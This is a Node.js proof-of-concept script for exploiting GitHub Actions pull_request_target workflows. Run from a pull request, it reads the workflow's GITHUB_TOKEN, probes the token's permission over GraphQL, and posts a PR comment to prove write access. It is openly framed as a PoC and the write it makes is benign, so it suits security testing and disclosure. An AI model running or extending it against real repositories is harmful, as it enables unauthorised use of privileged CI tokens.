// scripts/poc.mjs  (Node 20+, ESM)
import fs from 'node:fs/promises';

const env = process.env;
const repo = env.GITHUB_REPOSITORY || '';         // "owner/repo"
const token = env.GITHUB_TOKEN || '';
const apiBase = env.GITHUB_API_URL || 'https://api.github.com';
const eventPath = env.GITHUB_EVENT_PATH;
const eventName = env.GITHUB_EVENT_NAME;
const ref = env.GITHUB_REF;                       // e.g., refs/pull/123/merge
const headRef = env.GITHUB_HEAD_REF;              // source branch name on PRs
const actor = env.GITHUB_ACTOR;                   // user who triggered the run

console.log('PoC: attacker-controlled code executed in pull_request_target (prebuild)');
console.log(`[debug] event=${eventName} repo=${repo} ref=${ref} headRef=${headRef} actor=${actor}`);
console.log(`[debug] tokenPresent=${Boolean(token)} eventPathPresent=${Boolean(eventPath)}`);

async function getPrNumber() {
  // 1) Try event payload first
  try {
    if (eventPath) {
      const payloadRaw = await fs.readFile(eventPath, 'utf8');
      const payload = JSON.parse(payloadRaw);
      const n = payload?.pull_request?.number;
      if (n) return n;
    }
  } catch (e) {
    console.log('[debug] reading event payload failed:', e.message);
  }

  // 2) Fallback: parse from GITHUB_REF like "refs/pull/123/merge"
  if (ref && ref.startsWith('refs/pull/')) {
    const m = ref.match(/^refs\/pull\/(\d+)\/(merge|head)$/i);
    if (m) return Number(m[1]);
  }

  // 3) Last resort: query the API for PRs whose head is actor:branch
  try {
    if (repo && token && headRef && actor) {
      const url = new URL(`${apiBase}/repos/${repo}/pulls`);
      url.searchParams.set('state', 'open');
      url.searchParams.set('head', `${actor}:${headRef}`); // "owner:branch"
      const res = await fetch(url, {
        headers: {
          Authorization: `Bearer ${token}`,
          'User-Agent': 'poc-script',
          Accept: 'application/vnd.github+json'
        }
      });
      console.log('[debug] PR lookup via head=actor:branch status:', res.status);
      const arr = (await res.json()) || [];
      if (Array.isArray(arr) && arr.length) {
        return arr[0].number;
      }
    }
  } catch (e) {
    console.log('[debug] PR lookup failed:', e.message);
  }

  return undefined;
}

(async () => {
  const prNumber = await getPrNumber();

  if (!repo || !prNumber || !token) {
    console.log(`[warn] Missing inputs; skipping write test. repo=${Boolean(repo)} pr=${Boolean(prNumber)} token=${Boolean(token)}`);
    // Do not fail the build:
    process.exit(0);
  }

  // Optional read probe via GraphQL
  try {
    const [owner, name] = repo.split('/');
    const gql = await fetch(`${apiBase}/graphql`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${token}`,
        'User-Agent': 'poc-script',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        query: `query($owner:String!,$name:String!){
          viewer{login}
          repository(owner:$owner,name:$name){ viewerPermission }
        }`,
        variables: { owner, name }
      })
    });
    console.log('GraphQL probe status:', gql.status);
    const body = await gql.text();
    console.log('GraphQL probe body:', body.slice(0, 300));
  } catch (e) {
    console.log('GraphQL probe failed:', e.message);
  }

  // Harmless write: post PR comment
  try {
    const res = await fetch(`${apiBase}/repos/${repo}/issues/${prNumber}/comments`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${token}`,
        'User-Agent': 'poc-script',
        'Content-Type': 'application/json',
        Accept: 'application/vnd.github+json'
      },
      body: JSON.stringify({
        body: '🔐 PoC: `pull_request_target` write test. If you see this, the workflow token had PR write perms.'
      })
    });
    console.log('Comment POST status:', res.status);
    if (res.status === 201) {
      console.log('✅ Write confirmed: PR comment created.');
    } else if (res.status === 403) {
      console.log('🟡 Likely read-only token (403). No write perms.');
    } else {
      const t = await res.text();
      console.log('ℹ️ Unexpected response posting comment:', t.slice(0, 500));
    }
  } catch (e) {
    console.log('Comment POST failed:', e.message);
  }

  process.exit(0);
})();
